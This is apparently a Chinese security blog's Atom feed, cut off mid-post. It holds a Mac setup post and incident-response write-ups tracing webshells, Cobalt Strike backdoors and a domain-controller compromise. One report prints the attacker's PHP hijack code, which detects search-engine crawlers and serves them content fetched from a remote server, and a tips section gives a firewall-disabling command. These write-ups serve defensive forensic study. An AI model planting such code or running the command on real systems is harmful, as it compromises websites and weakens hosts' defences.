<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>技术阿涛</title>
  
  <subtitle>这是一个小小的网站</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-03-29T08:05:59.395Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>XiongTaoTao</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>mac踩坑</title>
    <link href="http://example.com/2023/03/29/mac%E8%B8%A9%E5%9D%91/"/>
    <id>http://example.com/2023/03/29/mac%E8%B8%A9%E5%9D%91/</id>
    <published>2023-03-29T02:56:59.000Z</published>
    <updated>2023-03-29T08:05:59.395Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Mac-Python环境配置"><a href="#Mac-Python环境配置" class="headerlink" title="Mac Python环境配置"></a>Mac Python环境配置</h1><p>系统默认安装python2</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230329105910934.png" alt="image-20230329105910934"></p><p>但没有pip</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230329105948466.png" alt="image-20230329105948466"></p><p>但python3有对应pip3</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230329110035707.png" alt="image-20230329110035707"></p><h2 id="解决pip共存"><a href="#解决pip共存" class="headerlink" title="解决pip共存"></a>解决pip共存</h2><p>安装brew</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot;</span><br></pre></td></tr></table></figure><p>执行成功后，还需要加入环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(echo; echo &#x27;eval &quot;$(/opt/homebrew/bin/brew shellenv)&quot;&#x27;) &gt;&gt; /Users/mac/.zprofile</span><br><span class="line">eval &quot;$(/opt/homebrew/bin/brew shellenv)&quot;</span><br></pre></td></tr></table></figure><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230329112759051.png" alt="image-20230329112759051"></p><p>下载对应版本的pip</p><p><code>https://bootstrap.pypa.io/pip/2.7/</code></p><p>用对应python执行脚本，但执行成功会遇到如下报错</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230329160456778.png" alt="image-20230329160456778"></p><p>此时需要添加环境变量，参考链接</p><p><code>https://blog.csdn.net/weixin_35683614/article/details/112716912</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export &quot;PATH=/Users/gangzhao/Library/Python/2.7/bin:$PATH&quot;</span><br></pre></td></tr></table></figure><h2 id="Mac执行shell脚本报错-Operation-not-permitted处理"><a href="#Mac执行shell脚本报错-Operation-not-permitted处理" class="headerlink" title="Mac执行shell脚本报错 Operation not permitted处理"></a>Mac执行shell脚本报错 Operation not permitted处理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-bash: ./install.sh: /bin/bash: bad interpreter: Operation not permitted</span><br></pre></td></tr></table></figure><p>出现这个问题的主要原因是：<code>-rwxrwxrwx@</code> 文件的属性最后带个@，这个@代表的是更多的一些属性，具体含义不太清楚，但有它就是执行不了</p><p>解决：可以用这个命令来去除这个属性：<br><code>xattr -d com.apple.quarantine ./*</code></p><p>后来进入目录发现目录下面的文件还是带有@属性，我们到根目录加一个-r就好了：<code>xattr -d -r com.apple.quarantine ./*</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Mac-Python环境配置&quot;&gt;&lt;a href=&quot;#Mac-Python环境配置&quot; class=&quot;headerlink&quot; title=&quot;Mac Python环境配置&quot;&gt;&lt;/a&gt;Mac Python环境配置&lt;/h1&gt;&lt;p&gt;系统默认安装python2&lt;/p&gt;
&lt;p&gt;&lt;</summary>
      
    
    
    
    <category term="踩坑" scheme="http://example.com/categories/%E8%B8%A9%E5%9D%91/"/>
    
    
    <category term="Mac" scheme="http://example.com/tags/Mac/"/>
    
  </entry>
  
  <entry>
    <title>攻防演练应急-Round-2</title>
    <link href="http://example.com/2023/03/27/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E5%BA%94%E6%80%A5-Round-2/"/>
    <id>http://example.com/2023/03/27/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E5%BA%94%E6%80%A5-Round-2/</id>
    <published>2023-03-26T16:35:45.000Z</published>
    <updated>2023-03-26T16:37:10.982Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a><strong>题目要求</strong></h1><p>客户说域控被打了，通过和现场⼈员沟通得到以下信息:</p><p>1、web(内网IP: 192.168.52.143)存在多个webshell, 存在异常帐号(⾮客户添加) </p><p>2、域控在内网(192.168.52.138) </p><p>3、时间⼤概在12⽉4⽇</p><h1 id="情况梳理"><a href="#情况梳理" class="headerlink" title="情况梳理"></a><strong>情况梳理</strong></h1><p>1、Win7主机对外开放web服务，YXcms存在前台模块修改文件功能（webshell大概率通过此漏洞攻击、写入），存在PHPmyadmin、管理后台弱口令（admin:123456）（rootroot），主机存在webshell、CS后门</p><p>2、综合域控服务器情况，推测攻击者拿下Web权限后，通过常见漏洞如永恒之蓝等（135、445）进行横向攻击，票据登录后上线CS，添加后门账号，服务器存在新增账号、CS后门</p><p>3、推测攻击者通过域控主机或堆溢出漏洞获取权限，并未开展后续攻击，主机并未发现后门病毒文件</p><table><thead><tr><th><em><strong>*2022&#x2F;12&#x2F;4 0:33*</strong></em></th><th>IP 192.168.161.88发起扫描</th></tr></thead><tbody><tr><td><em><strong>*2022&#x2F;12&#x2F;4 1:04*</strong></em></td><td>IP 192.168.161.88停止扫描</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 1:06*</strong></em></td><td>IP 192.168.161.88登录yxcms后台</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 1:39*</strong></em></td><td>IP 192.168.161.88编辑“前台模板”acomment.php</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 1:46*</strong></em></td><td>webshell（acomment.php）修改时间</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 1:47*</strong></em></td><td>IP 192.168.161.88访问db.sql（数据库相关信息）</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 1:49*</strong></em></td><td>IP 192.168.161.88访问phpmyadmin</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 1:53*</strong></em></td><td>IP 192.168.161.88尝试SQL查询写入webshell</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 2:00*</strong></em></td><td>webshell（controller.php）修改时间</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 2:02*</strong></em></td><td>webshell（controller.php）第一次请求</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 3:28*</strong></em></td><td>sfavsrv.exe上传web主机时间（192.168.161.87:89）</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 18:14*</strong></em></td><td>sfavsvc.exe上传web主机时间（192.168.161.87:5555）</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 20:27*</strong></em></td><td>webshell（controller.php）最后一次请求</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 22:27*</strong></em></td><td>域控CS后门最后一次访问时间</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 22:41*</strong></em></td><td>域控服务器新增qax3账号</td></tr></tbody></table><h1 id="排查情况"><a href="#排查情况" class="headerlink" title="排查情况"></a><strong>排查情况</strong></h1><h2 id="Win7-Web（192-168-52-143）"><a href="#Win7-Web（192-168-52-143）" class="headerlink" title="Win7-Web（192.168.52.143）"></a><strong>Win7-Web（192.168.52.143）</strong></h2><p>首先确认主机对外开放web服务（需手动启动PHPstudy），且存在双网卡</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps1.jpg" alt="img"> </p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps2.jpg" alt="img"> </p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps3.jpg" alt="img"> </p><p>根据提供情况，找到对应WEB根目录进行Webshell扫描，发现两个webshell</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps4.jpg" alt="img"> </p><p>通过后门排查工具发现CS后门（sfavsrv.exe）</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps5.jpg" alt="img"> </p><p>查看对应开放网站，相应页面存在信息泄露，包括后台管理页面、网站备份文件等</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps6.jpg" alt="img"> </p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps7.jpg" alt="img"> </p><p>通过定位Webshell文件，关联文件落地时间符合提供情况，通过恶意代码信息推测攻击者通过蚁剑工具连接</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps8.jpg" alt="img"> </p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps9.jpg" alt="img"> </p><p>关联网站页面接口，发现CMS管理后台登录（admin:123456）、PHPmyadmin（rootroot）均为默认密码</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps10.jpg" alt="img"> </p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps11.jpg" alt="img"> </p><p>排查webshell文件落地时间前后web日志，确认攻击时间线：</p><table><thead><tr><th><em><strong>*2022&#x2F;12&#x2F;4 0:33*</strong></em></th><th>IP 192.168.161.88发起扫描</th></tr></thead><tbody><tr><td><em><strong>*2022&#x2F;12&#x2F;4 1:04*</strong></em></td><td>IP 192.168.161.88停止扫描</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 1:06*</strong></em></td><td>IP 192.168.161.88登录yxcms后台</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 1:39*</strong></em></td><td>IP 192.168.161.88编辑“前台模板”acomment.php</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 1:46*</strong></em></td><td>webshell（acomment.php）修改时间</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 1:47*</strong></em></td><td>IP 192.168.161.88访问db.sql（数据库相关信息）</td></tr><tr><td></td><td></td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 1:49*</strong></em></td><td>IP 192.168.161.88访问phpmyadmin</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 1:53*</strong></em></td><td>IP 192.168.161.88尝试SQL查询写入webshell</td></tr><tr><td></td><td></td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 2:00*</strong></em></td><td>webshell（controller.php）修改时间</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 2:02*</strong></em></td><td>webshell（controller.php）第一次请求</td></tr><tr><td></td><td></td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 3:28*</strong></em></td><td>sfavsrv.exe上传时间（192.168.161.87:89）</td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 18:14*</strong></em></td><td>sfavsvc.exe上传时间（192.168.161.87:5555）</td></tr><tr><td></td><td></td></tr><tr><td><em><strong>*2022&#x2F;12&#x2F;4 20:27*</strong></em></td><td>webshell（controller.php）最后一次请求</td></tr></tbody></table><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps12.jpg" alt="img"><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps13.jpg" alt="img"> </p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps14.jpg" alt="img"><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps15.jpg" alt="img"> </p><p>通过攻击日志确认攻击者攻击入口，通过验证确认漏洞存在；</p><p>YXcms存在前台模块修改文件功能（webshell大概率通过此漏洞攻击、写入）</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps16.jpg" alt="img"> </p><p>PHPmyadmin则是存在SQL语句执行模块</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps17.jpg" alt="img"> </p><p>确认WEB攻击情况后，对主机进行其他常规项分析</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps18.jpg" alt="img"> </p><p>定位之前发现CS后门进程，以及对应持久化操作（伪装googleupdate服务）</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps19.jpg" alt="img"> </p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps20.jpg" alt="img"> </p><p>还发现同目录下存在其他可疑文件</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps21.jpg" alt="img"> </p><p>再次启动发现黑客C2地址：<em><strong>*192.168.161.87*</strong></em></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps22.jpg" alt="img"> </p><p>其他可疑文件C2地址也为：****192.168.161.87****，文件“ew_for_Win.exe”，未发现其他信息，但文件落地时间为同一天也较为可疑</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps23.jpg" alt="img"> </p><p>还发现可疑计划任务，尝试ping恶意域名</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps24.jpg" alt="img"> </p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps25.jpg" alt="img"> </p><p>根据情况确认可疑用户：****qax****，登录时间也符合排查情况</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps26.jpg" alt="img"> </p><p>最后确认当前主机为god域成员，随后对其他域控服务进行排查</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps27.jpg" alt="img"> </p><h2 id="Win2008域控（192-168-52-138）"><a href="#Win2008域控（192-168-52-138）" class="headerlink" title="Win2008域控（192.168.52.138）"></a><strong>Win2008域控（192.168.52.138）</strong></h2><p>首先确认域控信息，以及域内其他主机</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps28.jpg" alt="img"> </p><p>域控服务器相关高危端口（135、445、3389等）均开放</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps29.jpg" alt="img"> </p><p>确认服务器并没有打上永恒之蓝等补丁</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps30.jpg" alt="img"> </p><p>在排查启动项时，发现存在与上诉发现类似命名的计划任务，文件一致</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps31.jpg" alt="img"> </p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps32.jpg" alt="img"> </p><p>排查系统日志发现时间点2022&#x2F;12&#x2F;4 22:41:06，新增账号</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps33.jpg" alt="img"> </p><p>随后发现可疑注册表操作</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps34.jpg" alt="img"> </p><p>对应temp目录存在疑似反弹shell缓存文件</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps35.jpg" alt="img"> </p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps36.jpg" alt="img"> </p><p>综合域控服务器情况，推测攻击者拿下Web权限后，通过常见漏洞如永恒之蓝等（135、445）进行横向攻击，票据登录后上线CS，添加后门账号</p><h2 id="域成员Win2003（192-168-52-141）"><a href="#域成员Win2003（192-168-52-141）" class="headerlink" title="域成员Win2003（192.168.52.141）"></a><strong>域成员Win2003（192.168.52.141）</strong></h2><p>排查进程、启动项、服务、网络连接等，暂未发现异常</p><p>查看系统日志发现在对应12&#x2F;4时间段，域控IP登录域成员主机</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps37.jpg" alt="img"> </p><p>此外还发现主机上安装Kingview 6.53软件，且监听777端口</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps38.jpg" alt="img"> </p><p>关联发现存在堆溢出漏洞</p><p>类别：堆溢出</p><p>描述：此漏洞存在于KingView6.53软件的HistorySvr.exe进程中，这个软件服务程序在TCP 777端口监听时收到一个超长请求，导致堆缓冲区溢出从而执行任何代码。（<a href="https://www.cnblogs.com/justforfun12/p/5256405.html%EF%BC%89">https://www.cnblogs.com/justforfun12/p/5256405.html）</a></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/wps39.jpg" alt="img"> </p><p>但该主机上并未留有之前发现CS后门，推测攻击者通过域控主机或堆溢出漏洞获取权限，并未开展后续攻击</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目要求&quot;&gt;&lt;a href=&quot;#题目要求&quot; class=&quot;headerlink&quot; title=&quot;题目要求&quot;&gt;&lt;/a&gt;&lt;strong&gt;题目要求&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;客户说域控被打了，通过和现场⼈员沟通得到以下信息:&lt;/p&gt;
&lt;p&gt;1、web(内网IP: </summary>
      
    
    
    
    <category term="学习" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="域渗透" scheme="http://example.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>攻防演练应急</title>
    <link href="http://example.com/2023/03/17/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E5%BA%94%E6%80%A5/"/>
    <id>http://example.com/2023/03/17/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E5%BA%94%E6%80%A5/</id>
    <published>2023-03-17T14:51:08.000Z</published>
    <updated>2023-03-18T04:39:50.100Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查看防火墙的状态</span><br><span class="line">netsh firewall show state</span><br><span class="line"></span><br><span class="line"># 禁用系统防火墙</span><br><span class="line">netsh firewall set opmode disable</span><br><span class="line"></span><br><span class="line"># 启用防火墙</span><br><span class="line">netsh firewall set opmode enable</span><br></pre></td></tr></table></figure><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>客户说域控被打了, 扣分了<br>通过和现场⼈员沟通得到以下信息:</p><ol><li>环境里用一台win2008域控和一台win7主机</li><li>域控主机防⽕墙被关闭(⾮客户操作)</li><li>域控在内⽹，win7可以连接外网</li><li>时间⼤概在12⽉5⽇</li></ol><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>攻击者IP 192.168.161.88</p><p>2022.12.05 15:13:44：攻击者通过Thinphp漏洞攻击Win7主机</p><p>2022.12.05 15:13:44：成功上传webshell至Win7主机</p><p>随后上线CS后门（C:&#x2F;ew_for_Win.exe），并进行持久化操作</p><p>2022.12.05 20:43:50：Win7主机登录域管账户</p><p>2022.12.05 20:43:53：域控主机CS马上线</p><p>2022.12.05 20:50:07：域控主机异常服务创建，关闭防火墙</p><h1 id="排查确认"><a href="#排查确认" class="headerlink" title="排查确认"></a>排查确认</h1><h2 id="域控主机"><a href="#域控主机" class="headerlink" title="域控主机"></a>域控主机</h2><p>1、进入服务器便发现防火墙已被关闭，在排查服务时发现异常服务（没有描述信息、名称可疑），其操作为关闭防火墙</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318112421377.png" alt="image-20230318112421377"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318112652337.png"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318112543798.png" alt="image-20230318112543798"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318112616809.png" alt="image-20230318112616809"></p><p>2、通过搜索系统日志，服务创建 ，定位异常服务创建时间为：<strong>2022.12.05 20:50:07</strong></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318112853064.png" alt="image-20230318112853064"></p><p>3、在异常服务创建前后，发现可疑poweshell命令，创建时间为 <strong>2022.12.05 20:43:53</strong></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318113250504.png" alt="image-20230318113250504"></p><p>4、通过其他工具并未查看到该随机字符服务，根据内容推测为CS马通过powershell方式上线</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318113804291.png" alt="image-20230318113804291"></p><p>5、查看最早异常服务创建前后登录日志，发现win7主机IP 192.168.52.136登录域管账户，时间点 <strong>2022.12.05 20:43:50</strong></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318114521015.png" alt="image-20230318114521015"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318114611207.png" alt="image-20230318114611207"></p><p>6、发现日志ID为4662的日志，且时间段也为12.5当天，该日志出现在对Active Directory Object设置SACL时会出现，一般作为非法人员入侵后的异常提权参考</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318123806650.png"></p><p>7、且发现存在登录进程为票据登录日志</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318123850413.png" alt="image-20230318123850413"></p><p>8、根据现有发现情况，推测192.168.52.136通过内网横向的方式攻击域控服务器，通过黄金、白银票据等手段对域控服务器进行攻击，且成功拿到相关权限，上线CS马，并创建恶意服务关闭防火墙</p><h2 id="Win7主机"><a href="#Win7主机" class="headerlink" title="Win7主机"></a>Win7主机</h2><p>1、根据前期提供情况：<strong>域控在内⽹，win7可以连接外网</strong>，分析主机是否提供web、数据库等开放服务，从而暴露风险点导致攻击。确认主机对外开放WEB服务，可能作为攻击入侵点。</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318120212160.png" alt="image-20230318120212160"></p><p>2、首先通过工具查杀后门，存在CS马，定位恶意进程以及、注册表启动项、服务</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318120544221.png" alt="image-20230318120544221"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318120835508.png" alt="image-20230318120835508"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318120933234.png" alt="image-20230318120933234"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318121047991.png" alt="image-20230318121047991"></p><p>3、通过工具可以关联外联地址，推测为攻击者CS服务器，且在排查web目录时发现可疑文件，经沙箱后为CS后门本体，对应外联IP一致</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318121821370.png" alt="image-20230318121821370"></p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318122903663.png" alt="image-20230318122903663"></p><p>4、<strong>webshell上传时间：2022.12.05 15:13:44</strong>，对Apache中间件日志进行查看发现存在外部攻击日志，尝试上传webshell：date.php、date1.php</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318122438693.png" alt="image-20230318122438693"></p><p>通过wenshell查杀工具证实对应文件存在，且还发现较早时间段遗留的webshell：add.php</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318122502810.png" alt="image-20230318122502810"></p><p>5、<strong>漏洞攻击成功时间：2022.12.05 15:13:44</strong>，关联前后日志定位攻击成功记录，</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318122955889.png" alt="image-20230318122955889"></p><p>6、关联横向渗透迹象，未发现常见横向工具</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230318123426042.png" alt="image-20230318123426042"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TIPS&quot;&gt;&lt;a href=&quot;#TIPS&quot; class=&quot;headerlink&quot; title=&quot;TIPS&quot;&gt;&lt;/a&gt;TIPS&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;</summary>
      
    
    
    
    <category term="学习" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="域渗透" scheme="http://example.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>小工具get</title>
    <link href="http://example.com/2023/03/17/%E5%B0%8F%E5%B7%A5%E5%85%B7get/"/>
    <id>http://example.com/2023/03/17/%E5%B0%8F%E5%B7%A5%E5%85%B7get/</id>
    <published>2023-03-17T14:26:39.000Z</published>
    <updated>2023-03-17T14:29:02.693Z</updated>
    
    <content type="html"><![CDATA[<p>解码工具</p><p><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317222820431.png" alt="image-20230317222820431"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;解码工具&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317222820431.png&quot; alt=&quot;image-20230317222820431&quot;&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="学习" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>网页劫持</title>
    <link href="http://example.com/2023/03/17/%E7%BD%91%E9%A1%B5%E5%8A%AB%E6%8C%81/"/>
    <id>http://example.com/2023/03/17/%E7%BD%91%E9%A1%B5%E5%8A%AB%E6%8C%81/</id>
    <published>2023-03-17T03:25:15.000Z</published>
    <updated>2023-03-17T03:36:10.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-应急响应报告摘要"><a href="#1-应急响应报告摘要" class="headerlink" title="1 应急响应报告摘要"></a>1 应急响应报告摘要</h1><p>时间点2022年12月8日发现客户网站存在某种网页劫持，会将网页劫持跳转到<a href="http://www.baidu.com。应急响应专家在被入侵服务器上发现webshell以及修改部分配置恶意代码，分析后发现由于存在数据库（phpMyAdmin）弱口令导致被入侵，本次已排查定位入侵时间线、上传恶意文件以及对应存在隐患。确认结果如下：">www.baidu.com。应急响应专家在被入侵服务器上发现webshell以及修改部分配置恶意代码，分析后发现由于存在数据库（phpMyAdmin）弱口令导致被入侵，本次已排查定位入侵时间线、上传恶意文件以及对应存在隐患。确认结果如下：</a><br>1、判断劫持类型：User-Agent劫持（修改base.php代码）<br>2、详细的攻击路径和攻击时间点：phpMyAdmin弱口令–SQL查询语句写入一句话木马–修改base.php文件–产生网页劫持，具体时间线见下图<br><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230317112716273.png" alt="image-20230317112716273"><br>3、劫持代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$key= $_SERVER[&quot;HTTP_USER_AGENT&quot;];</span><br><span class="line">if(strpos($key,strtolower(&#x27;HaosouSpider&#x27;))!== false||strpos($key,strtolower(&#x27;baidu&#x27;))!== false||strpos($key,strtolower(&#x27;Yisou&#x27;))!== false||strpos($key,strtolower(&#x27;Sogou&#x27;))!== false||strpos($key,strtolower(&#x27;YisouSpider&#x27;))!== false||strpos($key,strtolower(&#x27;360Spider&#x27;))!== false||strpos($key,strtolower(&#x27;Baiduspide&#x27;))!== false||strpos($key,strtolower(&#x27;Soso&#x27;))!== false||strpos($key,strtolower(&#x27;Yahoo&#x27;))!== false||strpos($key,strtolower(&#x27;bingbot&#x27;))!== false )</span><br><span class="line">&#123;</span><br><span class="line">date_default_timezone_set(&#x27;PRC&#x27;);</span><br><span class="line">$TD_server = &quot;http://www.baidu.com&quot;;</span><br><span class="line">$host_name = &quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;PHP_SELF&#x27;];</span><br><span class="line">$Content_mb=file_get_contents($TD_server.&quot;/index.php?host=&quot;.$host_name.&quot;&amp;url=&quot;.$_SERVER[&#x27;QUERY_STRING&#x27;].&quot;&amp;domain=&quot;.$_SERVER[&#x27;SERVER_NAME&#x27;]);</span><br><span class="line">echo $Content_mb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2-应急现场概述"><a href="#2-应急现场概述" class="headerlink" title="2 应急现场概述"></a>2 应急现场概述</h1><h2 id="2-1-应急事件描述"><a href="#2-1-应急事件描述" class="headerlink" title="2.1 应急事件描述"></a>2.1 应急事件描述</h2><p>接到单位客户通知，客户被上级监管单位通报后存在异常外连并且门户网站被挂黑链，我司应急工程师到现场时发现已有用户和相关人员已经对现场环境进行处置，包括已经将问题主机断网处理并进行了全盘恶意程序查杀，并将可疑文件已经删除。 经过现场确认，中招服务器主机日志目前看还是比较完整，但是应用日志已经被攻击者清除，只有部分安全设备日志，本次应急通过仅存的主机日志和安全设备安全日志进行攻击路径分析。<br>客户网站存在某种网页劫持，会将网页劫持跳转到<a href="http://www.baidu.com.经排查确认为user-agent劫持,攻击者通过弱口令作为攻击起点,通过sql查询功能写入一句话木马,后续更改配置代码导致页面劫持(当user-agent为搜索引擎,如baidu、sogou等,就会跳转到www.baidu.com)./">www.baidu.com。经排查确认为User-Agent劫持，攻击者通过弱口令作为攻击起点，通过SQL查询功能写入一句话木马，后续更改配置代码导致页面劫持（当User-Agent为搜索引擎，如baidu、sogou等，就会跳转到www.baidu.com）。</a></p><h2 id="2-2-应急处置人员"><a href="#2-2-应急处置人员" class="headerlink" title="2.2 